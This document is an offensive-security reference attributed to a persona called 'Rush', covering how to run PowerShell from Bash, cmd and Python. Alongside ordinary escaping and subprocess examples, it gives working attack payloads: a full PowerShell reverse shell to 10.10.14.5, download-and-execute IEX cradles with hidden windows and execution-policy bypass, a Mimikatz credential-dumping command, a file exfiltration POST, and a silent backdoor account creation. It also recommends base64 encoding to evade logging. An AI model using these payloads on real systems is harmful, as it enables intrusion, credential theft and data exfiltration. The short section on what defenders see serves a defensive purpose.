# GS-25: Cross-Shell Execution — Rush's Bridge Patterns

> **Classification**: Royal Guard Knowledge Seed
> **Author**: Rush (The Breacher — Network Penetration)
> **Source**: Offensive PowerShell, Python subprocess Documentation, Real-World Tooling
> **Directive**: GS-27 — Think every route. Bash to PowerShell. Python to cmd. Every bridge works.

---

## 1. The Problem: Shell Boundaries

In penetration testing and automation, you constantly cross shell boundaries:
- A Python exploit needs to run PowerShell on a Windows target
- A Bash script on Kali needs to generate PowerShell payloads
- A CI/CD pipeline (Bash) needs to execute Windows administration commands
- An implant written in Python needs to execute cmd.exe or PowerShell commands

Each crossing introduces escaping problems, encoding issues, and execution quirks. This seed documents every pattern with working examples.

---

## 2. Pattern A: Simple -Command Execution

### 2.1 From Bash to PowerShell

```bash
# Basic command
powershell.exe -Command "Get-Process"

# With arguments
powershell.exe -Command "Get-Service | Where-Object { \$_.Status -eq 'Running' }"
# NOTE: $ must be escaped as \$ in bash to prevent bash variable expansion

# Multiple commands (semicolon-separated)
powershell.exe -Command "Get-Date; Get-ComputerInfo | Select-Object OsName"

# Store output in bash variable
RESULT=$(powershell.exe -Command "Get-NetFirewallProfile | Select-Object -ExpandProperty Enabled")
echo "$RESULT"

# Pipe bash output to PowerShell
echo "notepad" | powershell.exe -Command "\$input | ForEach-Object { Get-Process \$_ }"

# Execution policy bypass (when restricted)
powershell.exe -ExecutionPolicy Bypass -Command "Get-Process"

# Hidden window (no visible console — for automation/stealth)
powershell.exe -WindowStyle Hidden -Command "Get-Process > C:\Users\Public\procs.txt"

# No profile (skip user profile scripts — faster and cleaner)
powershell.exe -NoProfile -Command "Get-Date"

# Combined flags (common pattern for offensive use)
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"
```

### 2.2 From cmd.exe to PowerShell

```cmd
:: Basic execution from cmd
powershell -Command "Get-Process"

:: With special characters (use double quotes carefully)
powershell -Command "Get-ChildItem C:\Users\Public | Where-Object { $_.Length -gt 1MB }"

:: Passing cmd variables to PowerShell
set TARGET=192.168.1.100
powershell -Command "Test-NetConnection -ComputerName %TARGET% -Port 445"

:: Multi-line in cmd (use ^ for line continuation)
powershell -Command ^
  "$procs = Get-Process; ^
   $procs | Sort-Object CPU -Descending | ^
   Select-Object -First 10"
```

### 2.3 From PowerShell to cmd.exe

```powershell
# Run cmd command from PowerShell
cmd /c "dir C:\Users /s /b"

# Run cmd with variable
$target = "C:\Windows\System32"
cmd /c "dir `"$target`" /s /b"
# NOTE: Use backtick-quote (`") for paths with spaces inside cmd /c

# Capture cmd output
$output = cmd /c "ipconfig /all"
$output | Select-String "IPv4"

# Run cmd silently
cmd /c "net user attacker P@ssw0rd! /add" 2>&1 | Out-Null
```

### 2.4 Escaping Rules for Pattern A

| Context | Character | Escape |
|---|---|---|
| Bash calling PowerShell | `$` | `\$` |
| Bash calling PowerShell | `"` (inner) | `\"` |
| Bash calling PowerShell | `` ` `` | `` \` `` |
| Bash calling PowerShell | `!` (in double quotes) | `\!` or use single quotes |
| cmd calling PowerShell | `%` | `%%` |
| cmd calling PowerShell | `"` (inner) | `\"` or `""` |
| PowerShell calling cmd | `"` (inner) | `` `" `` |
| PowerShell calling cmd | `$` (literal) | `` `$ `` or use single quotes |

---

## 3. Pattern B: EncodedCommand (Base64)

When commands contain complex quoting, special characters, or need to survive multiple shell layers, Base64 encoding eliminates all escaping problems.

### 3.1 Generating Base64 Payloads

**From Linux/Bash**:
```bash
# Step 1: Write the PowerShell command
COMMAND='Get-Process | Where-Object { $_.CPU -gt 100 } | Select-Object Name, CPU'

# Step 2: Convert to UTF-16LE Base64 (PowerShell expects UTF-16LE, NOT UTF-8)
ENCODED=$(echo -n "$COMMAND" | iconv -t UTF-16LE | base64 -w 0)

# Step 3: Execute
powershell.exe -EncodedCommand "$ENCODED"

# One-liner function for reuse
function pwsh_enc() {
    local cmd="$1"
    local encoded=$(echo -n "$cmd" | iconv -t UTF-16LE | base64 -w 0)
    powershell.exe -EncodedCommand "$encoded"
}

# Usage
pwsh_enc 'Get-NetFirewallRule -Enabled True | Measure-Object'
```

**From PowerShell**:
```powershell
# Generate encoded command
$command = 'Get-Process | Where-Object { $_.CPU -gt 100 } | Select-Object Name, CPU'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)

# Display (copy this for use elsewhere)
Write-Output $encoded

# Execute locally
powershell -EncodedCommand $encoded

# Execute remotely
Invoke-Command -ComputerName TARGET -ScriptBlock {
    powershell -EncodedCommand $using:encoded
}
```

**From Python**:
```python
import base64

command = 'Get-Process | Where-Object { $_.CPU -gt 100 }'
# PowerShell expects UTF-16LE encoding
encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
print(f'powershell.exe -EncodedCommand {encoded}')
```

### 3.2 Common Encoded Payloads

**Reverse Shell (PowerShell)**:
```bash
# The PowerShell reverse shell command
SHELL='$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# Encode it
ENCODED=$(echo -n "$SHELL" | iconv -t UTF-16LE | base64 -w 0)

# Execute (or deliver via exploit)
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand "$ENCODED"
```

**Download and Execute**:
```bash
COMMAND='IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/Invoke-Mimikatz.ps1"); Invoke-Mimikatz -DumpCreds'
ENCODED=$(echo -n "$COMMAND" | iconv -t UTF-16LE | base64 -w 0)
powershell.exe -EncodedCommand "$ENCODED"
```

**File Exfiltration**:
```bash
COMMAND='$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\admin\Documents\secret.docx")); Invoke-WebRequest -Uri "http://10.10.14.5:8080/exfil" -Method POST -Body $data'
ENCODED=$(echo -n "$COMMAND" | iconv -t UTF-16LE | base64 -w 0)
powershell.exe -EncodedCommand "$ENCODED"
```

### 3.3 Decoding Base64 Payloads (For Analysis)

```bash
# Decode a captured EncodedCommand payload (from logs, network capture, etc.)
echo "BASE64STRING" | base64 -d | iconv -f UTF-16LE -t UTF-8
```

```powershell
# Decode in PowerShell
$encoded = "BASE64STRING"
[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
```

### 3.4 Why UTF-16LE?

PowerShell's `-EncodedCommand` parameter expects the command to be encoded in UTF-16LE (Unicode) before Base64 encoding. This is a Windows convention — Windows uses UTF-16LE internally. Using UTF-8 encoding will produce garbage when PowerShell tries to decode it.

```bash
# WRONG — UTF-8 encoding (will fail or produce garbage)
echo -n "Get-Process" | base64

# CORRECT — UTF-16LE encoding
echo -n "Get-Process" | iconv -t UTF-16LE | base64 -w 0
```

---

## 4. Pattern C: Script File Execution (.ps1)

### 4.1 Basic .ps1 Execution

```bash
# Create script file
cat > /tmp/audit.ps1 << 'PSEOF'
$ErrorActionPreference = "SilentlyContinue"
$results = @()

# Gather system info
$os = Get-CimInstance Win32_OperatingSystem
$results += "OS: $($os.Caption) $($os.Version)"
$results += "Hostname: $env:COMPUTERNAME"
$results += "Domain: $env:USERDNSDOMAIN"
$results += "Current User: $env:USERNAME"

# Network info
$adapters = Get-NetAdapter | Where-Object { $_.Status -eq "Up" }
foreach ($a in $adapters) {
    $ip = ($a | Get-NetIPAddress -AddressFamily IPv4).IPAddress
    $results += "Interface: $($a.Name) - IP: $ip"
}

# Output
$results | ForEach-Object { Write-Output $_ }
PSEOF

# Execute from bash (if on Windows with PowerShell available)
powershell.exe -ExecutionPolicy Bypass -File /tmp/audit.ps1

# Execute with arguments
powershell.exe -ExecutionPolicy Bypass -File /tmp/scan.ps1 -Target "192.168.1.0/24" -Port 445
```

### 4.2 Parameterized .ps1 Scripts

```powershell
# scan.ps1
param(
    [Parameter(Mandatory=$true)]
    [string]$Target,

    [Parameter(Mandatory=$false)]
    [int]$Port = 445,

    [Parameter(Mandatory=$false)]
    [int]$Timeout = 1000
)

$ErrorActionPreference = "SilentlyContinue"

# Parse CIDR if provided
if ($Target -match '/') {
    # Simple /24 expansion (for demonstration)
    $base = ($Target -split '/')[0]
    $octets = $base -split '\.'
    $ips = 1..254 | ForEach-Object { "$($octets[0]).$($octets[1]).$($octets[2]).$_" }
} else {
    $ips = @($Target)
}

foreach ($ip in $ips) {
    $tcp = New-Object System.Net.Sockets.TcpClient
    $connect = $tcp.BeginConnect($ip, $Port, $null, $null)
    $wait = $connect.AsyncWaitHandle.WaitOne($Timeout, $false)

    if ($wait -and $tcp.Connected) {
        Write-Output "[OPEN] ${ip}:${Port}"
        $tcp.Close()
    }
}
```

**Calling from bash**:
```bash
powershell.exe -ExecutionPolicy Bypass -File scan.ps1 -Target "192.168.1.0/24" -Port 3389 -Timeout 500
```

### 4.3 Inline Script Blocks (No File Needed)

```bash
# Using -Command with a script block (here-string style)
powershell.exe -NoProfile -Command '
    $services = Get-Service | Where-Object { $_.Status -eq "Running" }
    $services | ForEach-Object {
        $proc = Get-Process -Id (Get-CimInstance Win32_Service -Filter "Name=''$($_.Name)''").ProcessId -ErrorAction SilentlyContinue
        [PSCustomObject]@{
            Service = $_.DisplayName
            PID     = $proc.Id
            Memory  = [math]::Round($proc.WorkingSet64 / 1MB, 2)
        }
    } | Sort-Object Memory -Descending | Select-Object -First 20 | Format-Table -AutoSize
'
```

### 4.4 Execution Policy Bypass Methods

```bash
# Method 1: -ExecutionPolicy flag
powershell.exe -ExecutionPolicy Bypass -File script.ps1

# Method 2: Pipe to PowerShell (bypasses file-based policy)
cat script.ps1 | powershell.exe -NoProfile -

# Method 3: Download and execute (never touches disk as .ps1)
powershell.exe -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')"

# Method 4: Using Invoke-Expression with Get-Content
powershell.exe -Command "Get-Content script.ps1 | Invoke-Expression"

# Method 5: Using the . (dot-source) operator
powershell.exe -Command ". .\script.ps1"

# Method 6: Change policy for current user (persistent)
powershell.exe -Command "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted -Force"
```

---

## 5. Python subprocess Bridge

### 5.1 Basic subprocess Patterns

```python
import subprocess

# Pattern 1: Simple command, capture output
result = subprocess.run(
    ["powershell.exe", "-NoProfile", "-Command", "Get-Process | Select-Object -First 5"],
    capture_output=True,
    text=True,
    timeout=30
)
print(result.stdout)
if result.returncode != 0:
    print(f"Error: {result.stderr}")

# Pattern 2: cmd.exe command
result = subprocess.run(
    ["cmd.exe", "/c", "ipconfig /all"],
    capture_output=True,
    text=True
)
print(result.stdout)

# Pattern 3: Shell=True (use with caution — shell injection risk in production)
result = subprocess.run(
    'powershell.exe -Command "Get-Date"',
    shell=True,
    capture_output=True,
    text=True
)
```

### 5.2 EncodedCommand from Python

```python
import subprocess
import base64

def run_powershell(command: str, hidden: bool = False, timeout: int = 30) -> dict:
    """
    Execute a PowerShell command using EncodedCommand.
    Handles all encoding automatically.

    Args:
        command: The PowerShell command to execute
        hidden: Whether to hide the PowerShell window
        timeout: Timeout in seconds

    Returns:
        dict with 'stdout', 'stderr', 'returncode'
    """
    # Encode command as UTF-16LE then Base64
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')

    args = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass"]

    if hidden:
        args.extend(["-WindowStyle", "Hidden"])

    args.extend(["-EncodedCommand", encoded])

    try:
        result = subprocess.run(
            args,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return {
            'stdout': result.stdout.strip(),
            'stderr': result.stderr.strip(),
            'returncode': result.returncode
        }
    except subprocess.TimeoutExpired:
        return {
            'stdout': '',
            'stderr': 'Command timed out',
            'returncode': -1
        }

# Usage examples
# Simple command
output = run_powershell('Get-NetFirewallProfile | Select-Object Name, Enabled | ConvertTo-Json')
print(output['stdout'])

# Complex command with special characters (no escaping needed!)
output = run_powershell('''
    $users = Get-LocalUser | Where-Object { $_.Enabled -eq $true }
    $users | ForEach-Object {
        [PSCustomObject]@{
            Name = $_.Name
            LastLogon = $_.LastLogon
            PasswordRequired = $_.PasswordRequired
        }
    } | ConvertTo-Json
''')
print(output['stdout'])

# Command with variables and pipes
output = run_powershell('''
    $target = "192.168.1.100"
    $ports = @(21, 22, 80, 443, 445, 3389)
    $results = @()
    foreach ($port in $ports) {
        $tcp = New-Object System.Net.Sockets.TcpClient
        $connect = $tcp.BeginConnect($target, $port, $null, $null)
        $wait = $connect.AsyncWaitHandle.WaitOne(1000, $false)
        if ($wait -and $tcp.Connected) {
            $results += "${target}:${port} OPEN"
        }
        $tcp.Close()
    }
    $results | ConvertTo-Json
''')
print(output['stdout'])
```

### 5.3 Streaming Output (Long-Running Commands)

```python
import subprocess
import sys

def run_powershell_stream(command: str):
    """Stream PowerShell output line by line."""
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')

    process = subprocess.Popen(
        ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
         "-EncodedCommand", encoded],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1  # Line-buffered
    )

    # Stream stdout
    for line in process.stdout:
        print(line, end='')  # Print as it arrives
        sys.stdout.flush()

    # Wait for completion
    process.wait()

    # Check for errors
    if process.returncode != 0:
        print(f"\nError (exit code {process.returncode}):")
        print(process.stderr.read())

# Usage: stream a long-running scan
import base64
run_powershell_stream('''
    1..254 | ForEach-Object {
        $ip = "192.168.1.$_"
        $ping = Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1
        if ($ping) { Write-Output "[ALIVE] $ip" }
    }
''')
```

### 5.4 Async Execution

```python
import asyncio
import base64

async def run_powershell_async(command: str, timeout: int = 60) -> dict:
    """Execute PowerShell asynchronously."""
    encoded = base64.b64encode(command.encode('utf-16-le')).decode('ascii')

    process = await asyncio.create_subprocess_exec(
        "powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
        "-EncodedCommand", encoded,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )

    try:
        stdout, stderr = await asyncio.wait_for(
            process.communicate(), timeout=timeout
        )
        return {
            'stdout': stdout.decode().strip(),
            'stderr': stderr.decode().strip(),
            'returncode': process.returncode
        }
    except asyncio.TimeoutError:
        process.kill()
        return {'stdout': '', 'stderr': 'Timeout', 'returncode': -1}

# Run multiple commands in parallel
async def multi_scan():
    tasks = [
        run_powershell_async('Get-NetFirewallProfile | ConvertTo-Json'),
        run_powershell_async('Get-NetTCPConnection -State Listen | ConvertTo-Json'),
        run_powershell_async('Get-LocalUser | ConvertTo-Json'),
    ]
    results = await asyncio.gather(*tasks)
    for i, r in enumerate(results):
        print(f"Task {i}: {r['stdout'][:200]}...")

# asyncio.run(multi_scan())
```

### 5.5 Python to cmd.exe Bridge

```python
import subprocess

# Run cmd commands
def run_cmd(command: str, timeout: int = 30) -> dict:
    """Execute a cmd.exe command."""
    result = subprocess.run(
        ["cmd.exe", "/c", command],
        capture_output=True,
        text=True,
        timeout=timeout
    )
    return {
        'stdout': result.stdout.strip(),
        'stderr': result.stderr.strip(),
        'returncode': result.returncode
    }

# Examples
print(run_cmd("ipconfig /all")['stdout'])
print(run_cmd("netstat -an | findstr LISTENING")['stdout'])
print(run_cmd("net user")['stdout'])
print(run_cmd("whoami /priv")['stdout'])
print(run_cmd("systeminfo")['stdout'])
```

---

## 6. Bash-to-PowerShell Escaping Deep Dive

### 6.1 The Problem

Bash and PowerShell both interpret special characters, but differently. When you call PowerShell from Bash, both shells process the command string.

### 6.2 Complete Escaping Reference

```bash
# Dollar sign ($) — Bash interprets as variable
# WRONG:
powershell.exe -Command "Write-Output $env:USERNAME"
# Bash expands $env to nothing -> PowerShell gets: Write-Output :USERNAME

# CORRECT (escape the dollar):
powershell.exe -Command "Write-Output \$env:USERNAME"
# OR use single quotes (bash does not expand inside single quotes):
powershell.exe -Command 'Write-Output $env:USERNAME'

# Double quotes inside double quotes
# WRONG:
powershell.exe -Command "Get-ChildItem "C:\Users""
# CORRECT:
powershell.exe -Command "Get-ChildItem \"C:\Users\""
# OR:
powershell.exe -Command 'Get-ChildItem "C:\Users"'

# Backtick (PowerShell escape character)
# In bash double quotes, backtick needs escaping:
powershell.exe -Command "Write-Output \`\"Hello World\`\""

# Pipe character (|) — safe in both bash double and single quotes
powershell.exe -Command "Get-Process | Select-Object Name"

# Curly braces ({}) — safe in bash, used by PowerShell for script blocks
powershell.exe -Command 'Get-Service | Where-Object { $_.Status -eq "Running" }'

# Parentheses — safe in both
powershell.exe -Command '(Get-Date).ToString("yyyy-MM-dd")'

# Exclamation mark (!) — bash history expansion in interactive mode
# WRONG (in interactive bash):
powershell.exe -Command "Write-Output 'Hello!'"
# CORRECT:
powershell.exe -Command 'Write-Output "Hello!"'
# OR:
set +H  # Disable history expansion
powershell.exe -Command "Write-Output 'Hello!'"
```

### 6.3 The Golden Rule

**When in doubt, use EncodedCommand (Pattern B).** It eliminates ALL escaping issues because the command is Base64-encoded before it ever touches a shell.

```bash
# Instead of fighting escaping:
# powershell.exe -Command "Get-Service | Where-Object { \$_.Status -eq \"Running\" } | ForEach-Object { Write-Output \"\`$(\$_.Name): \$(\$_.DisplayName)\" }"

# Just encode it:
CMD='Get-Service | Where-Object { $_.Status -eq "Running" } | ForEach-Object { Write-Output "$($_.Name): $($_.DisplayName)" }'
ENC=$(echo -n "$CMD" | iconv -t UTF-16LE | base64 -w 0)
powershell.exe -EncodedCommand "$ENC"
```

---

## 7. Cross-Shell Execution Decision Matrix

| Scenario | Pattern | Why |
|---|---|---|
| Simple command, no special chars | A (-Command) | Fastest, simplest |
| Complex command, lots of quotes/variables | B (EncodedCommand) | No escaping headaches |
| Reusable audit/scan script | C (.ps1 file) | Parameterized, maintainable |
| Python automation calling PowerShell | Python + B | subprocess + base64 encoding |
| Stealth (avoid command-line logging) | B (EncodedCommand) | Single opaque string in logs |
| Debugging (need to see command) | A or C | Readable in process logs |
| Passing structured data back | Any + ConvertTo-Json | JSON output parsed by caller |

---

## 8. Security Considerations

### 8.1 Detection: What Defenders See

| Pattern | Log Entry | Detection |
|---|---|---|
| Pattern A | Full command visible in Event 4688 / ScriptBlock logging | Easy to detect |
| Pattern B | `-EncodedCommand <base64>` in Event 4688, decoded in ScriptBlock log 4104 | Base64 is a red flag to defenders |
| Pattern C | `-File script.ps1` in Event 4688, content in ScriptBlock log | File name visible, content logged |

### 8.2 AMSI (Anti-Malware Scan Interface)

PowerShell 5.0+ sends all script content to AMSI before execution. EncodedCommand does NOT bypass AMSI — the decoded content is still scanned.

```powershell
# AMSI test string (will be flagged)
# "Invoke-Mimikatz" -> AMSI blocks this

# AMSI bypass techniques exist but are cat-and-mouse with AV vendors
# This is noted for awareness, not as a recommendation for production use
```

### 8.3 Constrained Language Mode

PowerShell can be locked to Constrained Language Mode (CLM) via AppLocker or WDAC. In CLM, many offensive techniques fail:
```powershell
# Check current language mode
$ExecutionContext.SessionState.LanguageMode
# FullLanguage = unrestricted
# ConstrainedLanguage = restricted (no .NET, no COM, limited cmdlets)
```

### 8.4 Script Block Logging

When enabled, PowerShell logs the FULL content of every script block executed, including decoded EncodedCommand payloads:
```powershell
# Check if ScriptBlock logging is enabled
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue
```

---

## 9. Complete Working Examples

### 9.1 Bash Script: Remote Firewall Audit via WinRM

```bash
#!/bin/bash
# audit-firewall.sh — Run firewall audit on remote Windows host
# Usage: ./audit-firewall.sh <target> <user> <password>

TARGET="$1"
USER="$2"
PASS="$3"

AUDIT_CMD='
$rules = Get-NetFirewallRule -Enabled True -Direction Inbound -Action Allow
$results = foreach ($r in $rules) {
    $port = ($r | Get-NetFirewallPortFilter).LocalPort
    $addr = ($r | Get-NetFirewallAddressFilter).RemoteAddress
    [PSCustomObject]@{
        Name = $r.DisplayName
        Port = $port
        RemoteAddr = $addr
        Profile = $r.Profile
    }
}
$results | ConvertTo-Json -Depth 3
'

ENCODED=$(echo -n "$AUDIT_CMD" | iconv -t UTF-16LE | base64 -w 0)

# Execute via evil-winrm or similar
evil-winrm -i "$TARGET" -u "$USER" -p "$PASS" -c "powershell -EncodedCommand $ENCODED"
```

### 9.2 Python: Full Cross-Shell Toolkit

```python
#!/usr/bin/env python3
"""
cross_shell.py — Rush's Cross-Shell Execution Toolkit
Provides clean interfaces for Bash->PowerShell->cmd execution chains.
"""

import subprocess
import base64
import json
import platform
from typing import Optional

class ShellBridge:
    """Bridge between Python and Windows shells."""

    @staticmethod
    def powershell(command: str, encoded: bool = True,
                   timeout: int = 30, as_json: bool = False) -> dict:
        """
        Execute PowerShell command.

        Args:
            command: PowerShell command string
            encoded: Use EncodedCommand (recommended for complex commands)
            timeout: Timeout in seconds
            as_json: Append | ConvertTo-Json and parse output as JSON
        """
        if as_json:
            command = f"({command}) | ConvertTo-Json -Depth 5"

        if encoded:
            enc = base64.b64encode(command.encode('utf-16-le')).decode('ascii')
            args = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-EncodedCommand", enc]
        else:
            args = ["powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass",
                    "-Command", command]

        try:
            result = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
            output = result.stdout.strip()

            if as_json and output:
                try:
                    output = json.loads(output)
                except json.JSONDecodeError:
                    pass  # Return raw string if JSON parsing fails

            return {'output': output, 'error': result.stderr.strip(),
                    'code': result.returncode}
        except subprocess.TimeoutExpired:
            return {'output': '', 'error': 'Timeout', 'code': -1}

    @staticmethod
    def cmd(command: str, timeout: int = 30) -> dict:
        """Execute cmd.exe command."""
        try:
            result = subprocess.run(
                ["cmd.exe", "/c", command],
                capture_output=True, text=True, timeout=timeout
            )
            return {'output': result.stdout.strip(), 'error': result.stderr.strip(),
                    'code': result.returncode}
        except subprocess.TimeoutExpired:
            return {'output': '', 'error': 'Timeout', 'code': -1}

    @staticmethod
    def bash(command: str, timeout: int = 30) -> dict:
        """Execute bash command (for cross-platform scripts)."""
        shell = "/bin/bash" if platform.system() != "Windows" else "bash.exe"
        try:
            result = subprocess.run(
                [shell, "-c", command],
                capture_output=True, text=True, timeout=timeout
            )
            return {'output': result.stdout.strip(), 'error': result.stderr.strip(),
                    'code': result.returncode}
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            return {'output': '', 'error': str(e), 'code': -1}


# Usage examples
if __name__ == "__main__":
    bridge = ShellBridge()

    # Get firewall profiles as JSON
    profiles = bridge.powershell("Get-NetFirewallProfile", as_json=True)
    print("Firewall Profiles:", profiles['output'])

    # Get listening ports
    ports = bridge.powershell(
        "Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess",
        as_json=True
    )
    print("Listening Ports:", ports['output'])

    # Run cmd command
    ipconfig = bridge.cmd("ipconfig /all")
    print("IP Config:", ipconfig['output'][:500])
```

---

## 10. Quick Reference Card

```
PATTERN A (Simple):
  powershell.exe -Command "Get-Process"
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "..."

PATTERN B (Encoded):
  # Generate: echo -n "COMMAND" | iconv -t UTF-16LE | base64 -w 0
  powershell.exe -EncodedCommand "QQBCAEMAR..."

PATTERN C (File):
  powershell.exe -ExecutionPolicy Bypass -File script.ps1 -Param1 value

PYTHON BRIDGE:
  subprocess.run(["powershell.exe", "-EncodedCommand", encoded], capture_output=True, text=True)

ENCODING (ALWAYS UTF-16LE):
  Bash:   echo -n "$CMD" | iconv -t UTF-16LE | base64 -w 0
  Python: base64.b64encode(cmd.encode('utf-16-le')).decode('ascii')
  PS:     [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
```

---

*Rush speaks every shell's language. Bash, PowerShell, cmd, Python — they are not boundaries. They are bridges. Every shell is a door to the next shell. Every encoding is a key.*
